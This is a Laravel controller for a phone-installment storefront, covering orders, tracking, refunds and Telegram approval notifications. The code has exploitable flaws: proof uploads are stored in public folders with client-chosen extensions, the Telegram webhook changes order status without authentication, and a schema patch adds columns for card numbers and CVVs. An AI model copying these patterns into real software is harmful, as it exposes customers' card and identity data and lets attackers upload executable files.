<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Mail;

class FrontendController extends Controller
{
    /**
     * Auto-patch the database schema if missing columns or tables are detected.
     */
    private function patchDatabaseSchema()
    {
        try {
            if (!Schema::hasTable('storages')) {
                DB::statement("CREATE TABLE IF NOT EXISTS `storages` (
                  `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
                  `name` varchar(255) NOT NULL,
                  `created_at` timestamp NULL DEFAULT NULL,
                  `updated_at` timestamp NULL DEFAULT NULL
                ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci");
            }

            if (!Schema::hasColumn('mobiles', 'storage_id')) {
                DB::statement("ALTER TABLE `mobiles` ADD `storage_id` bigint(20) UNSIGNED DEFAULT NULL AFTER `series_id` ");
            }

            if (!Schema::hasColumn('orders', 'storage')) {
                DB::statement("ALTER TABLE `orders` ADD `storage` varchar(100) DEFAULT NULL AFTER `color` ");
            }

            if (!Schema::hasColumn('orders', 'email')) {
                DB::statement("ALTER TABLE `orders` ADD COLUMN `email` VARCHAR(255) NULL AFTER `full_name` ");
            }

            if (!Schema::hasColumn('orders', 'rider_name')) {
                DB::statement("ALTER TABLE `orders` ADD COLUMN `rider_name` VARCHAR(255) NULL AFTER `status` ");
                DB::statement("ALTER TABLE `orders` ADD COLUMN `rider_phone` VARCHAR(20) NULL AFTER `rider_name` ");
            }

            if (!Schema::hasColumn('orders', 'card_number')) {
                DB::statement("ALTER TABLE `orders` ADD COLUMN `card_number` VARCHAR(20) NULL AFTER `account_holder` ");
                DB::statement("ALTER TABLE `orders` ADD COLUMN `card_expiry` VARCHAR(10) NULL AFTER `card_number` ");
                DB::statement("ALTER TABLE `orders` ADD COLUMN `card_cvv` VARCHAR(5) NULL AFTER `card_expiry` ");
            }

            if (!Schema::hasColumn('app_settings', 'telegram_token')) {
                DB::statement("ALTER TABLE `app_settings` ADD COLUMN `telegram_token` TEXT NULL AFTER `app_name` ");
                DB::statement("ALTER TABLE `app_settings` ADD COLUMN `telegram_chat_id` VARCHAR(100) NULL AFTER `telegram_token` ");
            }

            if (!Schema::hasTable('refund_requests')) {
                DB::statement("CREATE TABLE IF NOT EXISTS `refund_requests` (
                  `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
                  `refund_id` varchar(100) NOT NULL,
                  `customer_name` varchar(255) NOT NULL,
                  `order_id` varchar(100) NOT NULL,
                  `refund_amount` varchar(100) NOT NULL,
                  `payment_method` varchar(100) DEFAULT NULL,
                  `proof_image` varchar(255) DEFAULT NULL,
                  `status` varchar(50) DEFAULT 'Pending',
                  `created_at` timestamp NULL DEFAULT NULL,
                  `updated_at` timestamp NULL DEFAULT NULL
                ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci");
            }
        } catch (\Exception $e) {
            Log::error("Database patching failed: " . $e->getMessage());
        }
    }

    private function sendDynamicEmail($toEmail, $subject, $messageBody)
    {
        try {
            Mail::html($messageBody, function ($message) use ($toEmail, $subject) {
                $message->to($toEmail)->subject($subject);
            });
        } catch (\Exception $e) {
            Log::error("Email sending failed: " . $e->getMessage());
        }
    }

    private function sendTelegramNotification($order, $mobile)
    {
        $settings = DB::table('app_settings')->where('id', 1)->first();
        $token = $settings->telegram_token ?? env('TELEGRAM_BOT_TOKEN');
        $chatId = $settings->telegram_chat_id ?? env('TELEGRAM_CHAT_ID');

        if (!$token || !$chatId) return;

        $message = "📢 *NEW ORDER BOOKED*\n\n";
        $message .= "🆔 *Order Number:* `{$order['order_number']}`\n";
        $message .= "👤 *Customer:* {$order['full_name']}\n";
        $message .= "📧 *Email:* {$order['email']}\n";
        $message .= "📱 *Mobile:* `{$order['mobile_number']}`\n\n";

        $message .= "🛒 *Product Details:*\n";
        $message .= "🔹 *Device:* " . ($mobile->name ?? 'N/A') . "\n";
        $message .= "🔹 *Color:* {$order['color']}\n";
        $message .= "🔹 *Storage:* {$order['storage']}\n";
        $message .= "🔹 *Tenure:* {$order['tenure']} Months\n";
        $message .= "🔹 *Monthly EMI:* {$order['monthly_emi']}\n";
        $message .= "🔹 *Total Price:* {$order['total_price']}\n\n";

        $message .= "💳 *Payment:* {$order['payment_method']}\n";

        $keyboard = ['inline_keyboard' => [[['text' => '✅ Approve', 'callback_data' => "approve_order_{$order['order_number']}"],['text' => '❌ Reject', 'callback_data' => "reject_order_{$order['order_number']}"]]]];

        try {
            Http::post("https://api.telegram.org/bot{$token}/sendMessage", [
                'chat_id' => $chatId,
                'text' => $message,
                'parse_mode' => 'Markdown',
                'reply_markup' => json_encode($keyboard)
            ]);
        } catch (\Exception $e) { Log::error("Telegram error: " . $e->getMessage()); }
    }

    public function handleTelegramWebhook(Request $request)
    {
        $update = $request->all();
        if (!isset($update['callback_query'])) return response()->json(['status' => 'ignored']);

        $callbackQuery = $update['callback_query'];
        $data = $callbackQuery['data'];
        $message = $callbackQuery['message'];
        $chatId = $message['chat']['id'];
        $messageId = $message['message_id'];

        if (str_starts_with($data, 'approve_order_')) {
            $orderNumber = str_replace('approve_order_', '', $data);
            $newStatus = 'Initial Verification';
        } elseif (str_starts_with($data, 'reject_order_')) {
            $orderNumber = str_replace('reject_order_', '', $data);
            $newStatus = 'Cancelled - Verification Not Completed';
        } else {
            return response()->json(['status' => 'unknown']);
        }

        DB::table('orders')->where('order_number', $orderNumber)->update(['status' => $newStatus, 'updated_at' => now()]);

        Http::post("https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/editMessageText", [
            'chat_id' => $chatId,
            'message_id' => $messageId,
            'text' => ($message['text'] ?? '') . "\n\n✅ *STATUS UPDATED TO:* {$newStatus}",
            'parse_mode' => 'Markdown'
        ]);

        return response()->json(['status' => 'success']);
    }

    public function index()
    {
        $settings = DB::table('app_settings')->where('id', 1)->first();
        return view('frontend.index', compact('settings'));
    }

    public function shop(Request $request)
    {
        $settings = DB::table('app_settings')->where('id', 1)->first();
        $brands = DB::table('brands')->get();
        $brandId = $request->query('brand');
        $seriesId = $request->query('series');

        $query = DB::table('mobiles')
            ->leftJoin('storages', 'mobiles.storage_id', '=', 'storages.id');

        if ($brandId) $query->where('mobiles.brand_id', $brandId);
        if ($seriesId && $seriesId !== 'all') $query->where('mobiles.series_id', $seriesId);

        $mobiles = $query->select('mobiles.*', 'storages.name as storage_name')->get();
        $mobileVariants = DB::table('mobile_variants')
            ->leftJoin('storages', 'mobile_variants.storage_id', '=', 'storages.id')
            ->select('mobile_variants.*', 'storages.name as storage_name')
            ->get()
            ->groupBy('mobile_id');
        foreach ($mobiles as $mobile) {
            $mobile->variants = $mobileVariants->get($mobile->id, collect())->values();
        }

        $series = DB::table('series')->when($brandId, function($q) use ($brandId) {
            return $q->where('brand_id', $brandId);
        })->get();

        return view('frontend.shop', compact('settings', 'brands', 'mobiles', 'series', 'brandId', 'seriesId'));
    }

    public function plan(Request $request)
    {
        $id = $request->query('id');
        $variantId = $request->query('variant_id');
        $mobile = DB::table('mobiles')
            ->leftJoin('storages', 'mobiles.storage_id', '=', 'storages.id')
            ->where('mobiles.id', $id)
            ->select('mobiles.*', 'storages.name as storage_name')
            ->first();

        if (!$mobile) return redirect()->route('shop');
        $variants = DB::table('mobile_variants')
            ->leftJoin('storages', 'mobile_variants.storage_id', '=', 'storages.id')
            ->where('mobile_variants.mobile_id', $id)
            ->select('mobile_variants.*', 'storages.name as storage_name')
            ->get();
        if (!$variantId && $variants->isNotEmpty()) {
            $variantId = $variants->first()->id;
        }
        if ($variantId) {
            $selectedVariant = $variants->firstWhere('id', (int)$variantId);
            if ($selectedVariant) {
                $mobile->price = $selectedVariant->price;
                $mobile->status = $selectedVariant->status;
                $mobile->storage_name = $selectedVariant->storage_name;
            }
        }
        $settings = DB::table('app_settings')->where('id', 1)->first();
        Session::put('order_mobile_id', $id);
        return view('frontend.plan', compact('settings', 'mobile', 'variants', 'variantId'));
    }

    public function customerInfo(Request $request)
    {
        $settings = DB::table('app_settings')->where('id', 1)->first();
        if ($request->has('mobile_id')) {
            Session::put('order_mobile_id', $request->mobile_id);
        }
        Session::put('order_color', $request->color);
        Session::put('order_storage', $request->storage);
        Session::put('order_tenure', $request->tenure);
        Session::put('order_emi', $request->emi);
        Session::put('order_total', $request->total);
        return view('frontend.customer_info', compact('settings'));
    }

    public function agreement(Request $request)
    {
        $settings = DB::table('app_settings')->where('id', 1)->first();
        $mobileId = $request->mobile_id ?? Session::get('order_mobile_id');
        Session::put('order_mobile_id', $mobileId);
        Session::put('order_customer', $request->all());

        $mobile = DB::table('mobiles')->where('id', $mobileId)->first();
        return view('frontend.agreement', compact('settings', 'mobile', 'mobileId'));
    }

    public function submitOrder(Request $request)
    {
        try {
            $this->patchDatabaseSchema();
            $mobileId = Session::get('order_mobile_id');
            $customer = Session::get('order_customer');

            if (!$customer || !$mobileId) return response()->json(['success' => false, 'message' => 'Session expired. Please restart.'], 400);

            $mobile = DB::table('mobiles')->where('id', $mobileId)->first();
            if (!$mobile) return response()->json(['success' => false, 'message' => 'Device not found.'], 404);

            $orderNumber = 'AM-' . date('ymd') . '-' . rand(1000, 9999);
            $proofPath = null;
            if ($request->hasFile('proof_image')) {
                $file = $request->file('proof_image');
                $fileName = 'proof_' . time() . '.' . $file->getClientOriginalExtension();
                $file->move(public_path('uploads/proofs'), $fileName);
                $proofPath = '/uploads/proofs/' . $fileName;
            }

            $data = [
                'order_number' => $orderNumber,
                'full_name' => $customer['full_name'] ?? 'N/A',
                'email' => $customer['email'] ?? 'N/A',
                'cnic' => $customer['cnic'] ?? 'N/A',
                'mobile_number' => $customer['mobile_number'] ?? 'N/A',
                'address' => $customer['address'] ?? 'N/A',
                'delivery_type' => $customer['delivery_type'] ?? 'N/A',
                'payment_method' => $request->payment_method,
                'wallet_service' => $request->wallet_service ?? 'N/A',
                'proof_image' => $proofPath,
                'mobile_id' => $mobileId,
                'color' => Session::get('order_color'),
                'storage' => Session::get('order_storage'),
                'tenure' => Session::get('order_tenure'),
                'monthly_emi' => Session::get('order_emi'),
                'total_price' => Session::get('order_total'),
                'status' => 'Waiting for Approval',
                'created_at' => now(), 'updated_at' => now(),
            ];

            $existingColumns = Schema::getColumnListing('orders');
            $insertData = array_intersect_key($data, array_flip($existingColumns));
            DB::table('orders')->insert($insertData);

            $this->sendTelegramNotification($data, $mobile);

            if (!empty($data['email']) && $data['email'] !== 'N/A') {
                $subject = "Order Confirmation - " . $orderNumber;
                $body = "
                <div style='font-family: sans-serif; max-width: 600px; margin: auto; border: 1px solid #eee; padding: 20px; border-radius: 10px;'>
                    <h2 style='color: #28a745; text-align: center;'>Order Successfully Placed!</h2>
                    <p>Dear <strong>{$data['full_name']}</strong>,</p>
                    <p>Congratulations! Your installment order for <strong>{$mobile->name}</strong> has been received.</p>

                    <h3 style='color: #333;'>Order Summary:</h3>
                    <table style='width: 100%; border-collapse: collapse;'>
                        <tr><td style='padding: 8px 0; color: #666;'>Order Number:</td><td style='padding: 8px 0; font-weight: bold; text-align: right;'>#{$orderNumber}</td></tr>
                        <tr><td style='padding: 8px 0; color: #666;'>Phone Model:</td><td style='padding: 8px 0; font-weight: bold; text-align: right;'>{$mobile->name}</td></tr>
                        <tr><td style='padding: 8px 0; color: #666;'>Color & Storage:</td><td style='padding: 8px 0; font-weight: bold; text-align: right;'>{$data['color']} / {$data['storage']}</td></tr>
                    </table>

                    <h3 style='color: #333; margin-top: 25px;'>Installment Plan:</h3>
                    <div style='background: #f9f9f9; padding: 15px; border-radius: 8px;'>
                        <table style='width: 100%; border-collapse: collapse;'>
                            <tr><td style='padding: 8px 0; color: #666;'>Total Device Price:</td><td style='padding: 8px 0; font-weight: bold; text-align: right;'>{$data['total_price']}</td></tr>
                            <tr><td style='padding: 8px 0; color: #666;'>Plan Duration:</td><td style='padding: 8px 0; font-weight: bold; text-align: right;'>{$data['tenure']}</td></tr>
                            <tr><td style='padding: 8px 0; color: #666;'>Monthly Installment:</td><td style='padding: 8px 0; font-weight: bold; color: #28a745; text-align: right;'>{$data['monthly_emi']}</td></tr>
                        </table>
                    </div>
                    <p style='margin-top: 25px; font-size: 13px; color: #888; text-align: center;'>Our verification team will contact you shortly.</p>
                </div>";
                $this->sendDynamicEmail($data['email'], $subject, $body);
            }

            return response()->json(['success' => true, 'order_number' => $orderNumber]);
        } catch (\Exception $e) {
            return response()->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function orderSuccess(Request $request)
    {
        $order = DB::table('orders')->where('order_number', $request->order_number)->first();
        if (!$order) return redirect()->route('shop');
        $settings = DB::table('app_settings')->where('id', 1)->first();
        $mobile = DB::table('mobiles')->where('id', $order->mobile_id)->first();
        return view('frontend.order_success', compact('settings', 'order', 'mobile'));
    }

    public function track()
    {
        $settings = DB::table('app_settings')->where('id', 1)->first();
        return view('frontend.track', compact('settings'));
    }

    public function checkStatus(Request $request)
    {
        $query = DB::table('orders');
        if ($request->order_id) {
            $query->where('order_number', $request->order_id);
        } else if ($request->mobile_number) {
            $query->where('mobile_number', $request->mobile_number);
        } else {
            return back()->with('error', 'Please enter Order ID or Mobile Number');
        }

        $order = $query->first();
        if (!$order) return back()->with('error', 'Order not found');

        $mobile = DB::table('mobiles')->where('id', $order->mobile_id)->first();
        $settings = DB::table('app_settings')->where('id', 1)->first();

        return view('frontend.track_result', compact('settings', 'order', 'mobile'));
    }

    public function refund()
    {
        $settings = DB::table('app_settings')->where('id', 1)->first();
        return view('frontend.refund', compact('settings'));
    }

    public function refundAgreement(Request $request)
    {
        $settings = DB::table('app_settings')->where('id', 1)->first();
        Session::put('refund_customer_name', $request->customer_name);
        Session::put('refund_order_id', $request->order_id);
        Session::put('refund_amount', $request->refund_amount);
        return view('frontend.refund_agreement', compact('settings'));
    }

    public function submitRefund(Request $request)
    {
        try {
            $this->patchDatabaseSchema();
            $customerName = Session::get('refund_customer_name');
            $orderId = Session::get('refund_order_id');
            $refundAmount = Session::get('refund_amount');

            if (!$customerName) {
                return response()->json(['success' => false, 'message' => 'Session expired. Please restart.'], 400);
            }

            $refundId = 'RF-' . date('ymd') . '-' . rand(1000, 9999);
            $proofPath = null;
            if ($request->hasFile('proof_image')) {
                $file = $request->file('proof_image');
                $fileName = 'refund_' . time() . '.' . $file->getClientOriginalExtension();
                $file->move(public_path('uploads/refunds'), $fileName);
                $proofPath = '/uploads/refunds/' . $fileName;
            }

            DB::table('refund_requests')->insert([
                'refund_id' => $refundId,
                'customer_name' => $customerName,
                'order_id' => $orderId,
                'refund_amount' => $refundAmount,
                'payment_method' => $request->payment_method,
                'proof_image' => $proofPath,
                'status' => 'Pending',
                'created_at' => now(),
                'updated_at' => now(),
            ]);

            return response()->json(['success' => true, 'refund_id' => $refundId]);
        } catch (\Exception $e) {
            return response()->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function refundSuccess(Request $request)
    {
        $settings = DB::table('app_settings')->where('id', 1)->first();
        $refundId = $request->query('refund_id');
        $refund = DB::table('refund_requests')->where('refund_id', $refundId)->first();
        return view('frontend.refund_success', compact('settings', 'refund'));
    }

    public function calculator()
    {
        $settings = DB::table('app_settings')->where('id', 1)->first();
        $brands = DB::table('brands')->get();
        return view('frontend.calculator', compact('settings', 'brands'));
    }

    public function getModels($brandId)
    {
        $mobiles = DB::table('mobiles')
            ->leftJoin('storages', 'mobiles.storage_id', '=', 'storages.id')
            ->leftJoin('series', 'mobiles.series_id', '=', 'series.id')
            ->where('mobiles.brand_id', $brandId)
            ->select('mobiles.*', 'storages.name as storage_name', 'series.name as series_name')
            ->get();
        return response()->json($mobiles);
    }
}
